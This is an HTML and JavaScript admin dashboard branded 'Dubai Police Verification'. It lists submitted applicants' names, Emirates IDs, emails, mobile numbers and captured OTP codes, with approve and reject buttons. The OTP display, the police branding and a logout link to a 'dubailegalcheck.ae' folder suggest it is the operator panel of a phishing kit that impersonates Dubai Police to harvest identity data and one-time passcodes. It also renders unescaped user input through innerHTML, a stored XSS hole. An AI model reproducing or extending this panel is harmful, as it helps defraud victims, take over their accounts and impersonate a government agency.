<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Dubai Police Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #00a99d 0%, #008c84 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: white;
            padding: 20px 30px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            color: #333;
            font-size: 24px;
        }

        .logout-btn {
            background: #e74c3c;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }

        .logout-btn:hover {
            background: #c0392b;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .stat-card h3 {
            color: #666;
            font-size: 14px;
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        .stat-card .number {
            font-size: 32px;
            font-weight: bold;
            color: #00a99d;
        }

        .applications {
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 30px;
        }

        .applications h2 {
            color: #333;
            margin-bottom: 20px;
            font-size: 20px;
        }

        .filters {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .filter-btn {
            padding: 8px 16px;
            border: 2px solid #00a99d;
            background: white;
            color: #00a99d;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
        }

        .filter-btn:hover {
            background: rgba(0, 169, 157, 0.1);
        }

        .filter-btn.active {
            background: #00a99d;
            color: white;
        }

        .application-table {
            width: 100%;
            border-collapse: collapse;
            overflow-x: auto;
            display: block;
        }

        .application-table thead {
            background: #f8f9fa;
        }

        .application-table th,
        .application-table td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #e9ecef;
        }

        .application-table th {
            font-weight: 600;
            color: #495057;
            font-size: 14px;
        }

        .application-table tbody tr {
            cursor: pointer;
            transition: background 0.2s;
        }

        .application-table tbody tr:hover {
            background: #f8f9fa;
        }

        .status {
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            display: inline-block;
        }

        .status.pending {
            background: #fff3cd;
            color: #856404;
        }

        .status.approved {
            background: #d4edda;
            color: #155724;
        }

        .status.rejected {
            background: #f8d7da;
            color: #721c24;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 10px;
            padding: 30px;
            max-width: 600px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #e9ecef;
        }

        .modal-header h2 {
            color: #333;
            font-size: 22px;
        }

        .close-btn {
            background: none;
            border: none;
            font-size: 28px;
            cursor: pointer;
            color: #999;
        }

        .close-btn:hover {
            color: #333;
        }

        .detail-row {
            margin-bottom: 15px;
        }

        .detail-row label {
            display: block;
            color: #666;
            font-size: 12px;
            margin-bottom: 5px;
            text-transform: uppercase;
        }

        .detail-row .value {
            color: #333;
            font-size: 16px;
            font-weight: 500;
        }

        .action-buttons {
            display: flex;
            gap: 10px;
            margin-top: 25px;
        }

        .btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
        }

        .btn-approve {
            background: #28a745;
            color: white;
        }

        .btn-approve:hover {
            background: #218838;
        }

        .btn-reject {
            background: #dc3545;
            color: white;
        }

        .btn-reject:hover {
            background: #c82333;
        }

        .no-data {
            text-align: center;
            padding: 40px;
            color: #999;
        }

        .search-box {
            margin-bottom: 20px;
        }

        .search-box input {
            width: 100%;
            padding: 12px 20px;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            font-size: 16px;
            transition: border 0.3s;
        }

        .search-box input:focus {
            outline: none;
            border-color: #00a99d;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #999;
        }

        .empty-state-icon {
            font-size: 64px;
            margin-bottom: 20px;
            opacity: 0.3;
        }

        @media (max-width: 768px) {
            body {
                padding: 10px;
            }

            .header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }

            .header h1 {
                font-size: 20px;
            }

            .stats {
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
            }

            .stat-card {
                padding: 20px;
            }

            .stat-card .number {
                font-size: 24px;
            }

            .applications {
                padding: 20px;
            }

            .application-table {
                font-size: 12px;
            }

            .application-table th,
            .application-table td {
                padding: 8px;
            }

            .filters {
                justify-content: center;
            }

            .filter-btn {
                font-size: 12px;
                padding: 6px 12px;
            }

            .modal-content {
                padding: 20px;
            }

            .action-buttons {
                flex-direction: column;
            }
        }

        @media (max-width: 480px) {
            .stats {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üõ°Ô∏è Admin Dashboard - Dubai Police Verification</h1>
            <button class="logout-btn" onclick="logout()">Logout</button>
        </div>

        <div class="stats">
            <div class="stat-card">
                <h3>Total Applications</h3>
                <div class="number" id="totalCount">0</div>
            </div>
            <div class="stat-card">
                <h3>Pending</h3>
                <div class="number" id="pendingCount">0</div>
            </div>
            <div class="stat-card">
                <h3>Approved</h3>
                <div class="number" id="approvedCount">0</div>
            </div>
            <div class="stat-card">
                <h3>Rejected</h3>
                <div class="number" id="rejectedCount">0</div>
            </div>
        </div>

        <div class="applications">
            <h2>Verification Applications</h2>
            
            <div class="search-box">
                <input type="text" id="searchInput" placeholder="üîç Search by name, Emirates ID, email, or mobile..." onkeyup="searchApplications()">
            </div>
            
            <div class="filters">
                <button class="filter-btn active" onclick="filterApplications('all')">All</button>
                <button class="filter-btn" onclick="filterApplications('pending')">Pending</button>
                <button class="filter-btn" onclick="filterApplications('approved')">Approved</button>
                <button class="filter-btn" onclick="filterApplications('rejected')">Rejected</button>
            </div>

            <table class="application-table">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Full Name</th>
                        <th>Emirates ID</th>
                        <th>Email</th>
                        <th>Mobile</th>
                        <th>Status</th>
                        <th>Date</th>
                    </tr>
                </thead>
                <tbody id="applicationsList">
                    <tr>
                        <td colspan="7" class="no-data">No applications found</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Modal for application details -->
    <div class="modal" id="detailModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Application Details</h2>
                <button class="close-btn" onclick="closeModal()">&times;</button>
            </div>
            <div id="modalBody"></div>
        </div>
    </div>

    <script>
        let applications = [];
        let currentFilter = 'all';
        let searchQuery = '';

        // Load applications from localStorage
        function loadApplications() {
            const stored = localStorage.getItem('verificationApplications');
            applications = stored ? JSON.parse(stored) : [];
            updateStats();
            renderApplications();
        }

        // Update statistics
        function updateStats() {
            const total = applications.length;
            const pending = applications.filter(a => a.status === 'pending').length;
            const approved = applications.filter(a => a.status === 'approved').length;
            const rejected = applications.filter(a => a.status === 'rejected').length;

            document.getElementById('totalCount').textContent = total;
            document.getElementById('pendingCount').textContent = pending;
            document.getElementById('approvedCount').textContent = approved;
            document.getElementById('rejectedCount').textContent = rejected;
        }

        // Search applications
        function searchApplications() {
            searchQuery = document.getElementById('searchInput').value.toLowerCase();
            renderApplications();
        }

        // Render applications table
        function renderApplications() {
            const tbody = document.getElementById('applicationsList');
            let filtered = applications;

            // Apply status filter
            if (currentFilter !== 'all') {
                filtered = filtered.filter(a => a.status === currentFilter);
            }

            // Apply search filter
            if (searchQuery) {
                filtered = filtered.filter(a => 
                    (a.fullName && a.fullName.toLowerCase().includes(searchQuery)) ||
                    (a.emiratesId && a.emiratesId.toLowerCase().includes(searchQuery)) ||
                    (a.email && a.email.toLowerCase().includes(searchQuery)) ||
                    (a.mobileNumber && a.mobileNumber.toLowerCase().includes(searchQuery))
                );
            }

            if (filtered.length === 0) {
                tbody.innerHTML = `<tr><td colspan="7" class="no-data">
                    <div class="empty-state">
                        <div class="empty-state-icon">üìã</div>
                        <p>${searchQuery ? 'No applications match your search' : 'No applications found'}</p>
                    </div>
                </td></tr>`;
                return;
            }

            tbody.innerHTML = filtered.map(app => `
                <tr onclick="showDetails('${app.id}')">
                    <td>${app.id.substring(0, 8)}</td>
                    <td>${app.fullName || 'N/A'}</td>
                    <td>${app.emiratesId || 'N/A'}</td>
                    <td>${app.email || 'N/A'}</td>
                    <td>${app.mobileNumber || 'N/A'}</td>
                    <td><span class="status ${app.status}">${app.status.toUpperCase()}</span></td>
                    <td>${new Date(app.timestamp).toLocaleDateString()}</td>
                </tr>
            `).join('');
        }

        // Filter applications
        function filterApplications(status) {
            currentFilter = status;
            
            // Update active button
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            
            renderApplications();
        }

        // Show application details
        function showDetails(id) {
            const app = applications.find(a => a.id === id);
            if (!app) return;

            const modalBody = document.getElementById('modalBody');
            modalBody.innerHTML = `
                <div class="detail-row">
                    <label>Application ID</label>
                    <div class="value">${app.id}</div>
                </div>
                <div class="detail-row">
                    <label>Full Name</label>
                    <div class="value">${app.fullName}</div>
                </div>
                <div class="detail-row">
                    <label>Emirates ID</label>
                    <div class="value">${app.emiratesId}</div>
                </div>
                <div class="detail-row">
                    <label>Email</label>
                    <div class="value">${app.email}</div>
                </div>
                <div class="detail-row">
                    <label>Mobile Number</label>
                    <div class="value">${app.mobileNumber}</div>
                </div>
                <div class="detail-row">
                    <label>Nationality</label>
                    <div class="value">${app.nationality || 'Not provided'}</div>
                </div>
                <div class="detail-row">
                    <label>OTP Code</label>
                    <div class="value">${app.otp || 'N/A'}</div>
                </div>
                <div class="detail-row">
                    <label>Status</label>
                    <div class="value"><span class="status ${app.status}">${app.status.toUpperCase()}</span></div>
                </div>
                <div class="detail-row">
                    <label>Submission Date</label>
                    <div class="value">${new Date(app.timestamp).toLocaleString()}</div>
                </div>
                ${app.status === 'pending' ? `
                <div class="action-buttons">
                    <button class="btn btn-approve" onclick="updateStatus('${app.id}', 'approved')">‚úì Approve</button>
                    <button class="btn btn-reject" onclick="updateStatus('${app.id}', 'rejected')">‚úó Reject</button>
                </div>
                ` : ''}
            `;

            document.getElementById('detailModal').classList.add('active');
        }

        // Update application status
        function updateStatus(id, status) {
            const index = applications.findIndex(a => a.id === id);
            if (index !== -1) {
                applications[index].status = status;
                applications[index].statusUpdatedAt = new Date().toISOString();
                localStorage.setItem('verificationApplications', JSON.stringify(applications));
                
                loadApplications();
                closeModal();
                
                alert(`Application ${status === 'approved' ? 'approved' : 'rejected'} successfully!`);
            }
        }

        // Close modal
        function closeModal() {
            document.getElementById('detailModal').classList.remove('active');
        }

        // Logout
        function logout() {
            if (confirm('Are you sure you want to logout?')) {
                window.location.href = '../dubailegalcheck.ae/index.html';
            }
        }

        // Close modal when clicking outside
        document.getElementById('detailModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeModal();
            }
        });

        // Initialize
        loadApplications();

        // Auto-refresh every 5 seconds
        setInterval(loadApplications, 5000);
    </script>
</body>
</html>
